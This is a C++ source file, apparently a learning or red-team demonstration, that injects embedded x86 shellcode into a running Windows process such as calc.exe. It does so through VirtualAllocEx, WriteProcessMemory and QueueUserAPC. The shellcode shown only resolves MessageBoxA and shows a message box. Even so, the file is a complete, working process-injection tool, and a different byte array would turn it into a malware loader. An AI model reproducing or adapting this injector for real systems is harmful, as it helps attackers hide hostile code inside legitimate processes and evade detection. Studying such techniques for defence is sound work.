//                  APC - PROCESS INJECTION METHOD
/* Method of injecting payload using QueueUserAPC() function */
/* Purpose:
            Inject 'payload/callMsg.cpp' to calc.exe process
            Make sure the calculator is running              
            --> This will pop a message box on successful injection
    Note: executer defined is the byte code of callMsg.cpp
*/

#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

#pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib
using namespace std;

byte executer[] = {
"\x55\x8b\xec\x83\xec\x20\x53\x56\x57\xc6\x45\xf8\x54\xc6\x45\xf9\x69\xc6\x45\xfa\x74\xc6\x45\xfb\x6c\xc6\x45\xfc\x65\xc6\x45\xfd\x00\xc6\x45\xe4\x4d\xc6\x45\xe5\x65\xc6\x45\xe6\x73\xc6\x45\xe7\x73\xc6\x45\xe8\x61\xc6\x45\xe9\x67\xc6\x45\xea\x65\xc6\x45\xeb\x00\xc6\x45\xec\x4d\xc6\x45\xed\x65\xc6\x45\xee\x73\xc6\x45\xef\x73\xc6\x45\xf0\x61\xc6\x45\xf1\x67\xc6\x45\xf2\x65\xc6\x45\xf3\x42\xc6\x45\xf4\x6f\xc6\x45\xf5\x78\xc6\x45\xf6\x00\xe9\x9c\x00\x00\x00\xe9\x97\x00\x00\x00\x55\x8b\xec\x83\xec\x20\x53\x52\x56\x57\x89\x4d\xfc\x33\xc0\x8b\xf9\x33\xc9\xf7\xd1\xfc\xf2\xae\xf7\xd9\x89\x4d\xf8\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x58\x10\x8b\x4b\x3c\x8b\x54\x0b\x78\x03\xd3\x8b\x4a\x18\x8b\x72\x1c\x8b\x7a\x24\x8b\x52\x20\x03\xd3\x89\x75\xf4\x89\x7d\xf0\xe3\x3a\x49\x8b\x34\x8a\x03\xf3\x51\x33\xc0\x8b\x7d\xfc\x8b\x4d\xf8\x4e\x4f\x46\x47\x8a\x06\x3a\x07\xe1\xf8\x85\xc9\x59\x75\xe0\x8b\x55\xf0\x03\xd3\xd1\xe1\x03\xd1\x0f\xb7\x0a\x8b\x75\xf4\x03\xf3\xc1\xe1\x02\x03\xf1\x8b\x06\x03\xc3\xeb\x05\xb8\xff\xff\xff\xff\x5f\x5e\x5a\x5b\x83\xc4\x20\xc9\xc3\x8d\x4d\xec\xe8\x61\xff\xff\xff\x89\x45\xe0\x83\xf8\xff\x74\x13\x6a\x00\x8d\x45\xe4\x50\x8d\x4d\xf8\x51\x6a\x00\xff\x55\xe0\xeb\x05\xeb\x03\x90\xeb\xfd\x5f\x5e\x5b\x8b\xe5\x5d\xc2\x04\x00"
};

bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;
    pid = 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (::Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
            	cout<<"[i] Found process ("<<exeName<<"), pid: "<<pid<<endl;
                THREADENTRY32 te = { sizeof(te) };
                cout<<"[i] Threads found to inject: ";
                if (::Thread32First(hSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                        	cout<<te.th32ThreadID<<"  ";
                            tids.push_back(te.th32ThreadID);
                        }
                    } while (::Thread32Next(hSnapshot, &te));
                }
                cout<<endl;
                break;
            }
        } while (::Process32Next(hSnapshot, &pe));
    }
    ::CloseHandle(hSnapshot);
    return pid > 0 && !tids.empty();
}

void inject(char* process){
	DWORD pid;
	vector<DWORD> tids;
	LPVOID exe = executer;
	ULONG size = sizeof(executer);

	if (FindProcess(process, pid, tids)) {
		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
		if(hProcess==NULL){
			cout<<"[!] failed to get handle for process: "<<pid<<endl;
			return;
		}
		auto p = ::VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if(p==NULL) {
			cout<<"[!] memory allocation failed!"<<endl;
			return ;
		}else{cout<<"[+] virtual mem allocation success"<<endl;}
		unsigned long injectedFn = (unsigned long)p;
		cout<<"[i] allocated memory address: 0x"<<hex<<injectedFn<<dec<<endl;

		if(::WriteProcessMemory(hProcess, p, exe, size, NULL)==0){
			DWORD err = GetLastError();
			cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
			return ;
		}else{cout<<"[+] write to process success"<<endl;}
		// cout<<"[+] Sleeping for 15s"<<endl;
		// Sleep(5000);

		for(vector<DWORD>::size_type i = 2; i != tids.size(); i++) {
			DWORD tid = tids[i];
			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
			cout<<endl;
			HMODULE hModule = LoadLibrary("User32.dll");
			if(hModule==NULL){
				cout<<"[!] Failed to get handle to module"<<endl;
				return;
			}
			ULONG_PTR messageBoxAddr = (ULONG_PTR)GetProcAddress(hModule, "MessageBoxA");
			if(messageBoxAddr==NULL){
				cout<<"[!] failed to get MessageBox addr! error: "<<GetLastError()<<endl;
				return;
			}
			cout<<"[i] MessageBox addr: 0x"<<hex<<messageBoxAddr<<dec<<endl;
			if (hThread!=NULL) {
				if(::QueueUserAPC(
					(PAPCFUNC)p,
					hThread, 
					messageBoxAddr)==0){
					cout<<"[!] failed to queue user apc"<<endl;
				}
				else{
					cout<<"[+] user apc queued for thread (id: "<<tid<<")"<<endl;
				}
			}
			else{
				cout<<"[!] OpenThread failed to open thread (id: "<<tid<<")"<<endl;
				return;
			}
            break;
		}
		::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
		cout<<"[+] VirtualFreeEx"<<endl;
	}
	else{
		cout<<"[!] specified process not found"<<endl;
	}
}

void main(int argc, char* argv[]){
    if(argc!=2){
        cout<<"Usage: apcInjectNoDll.exe process"<<endl;
        return;
    }
    inject(argv[1]);
    return;
}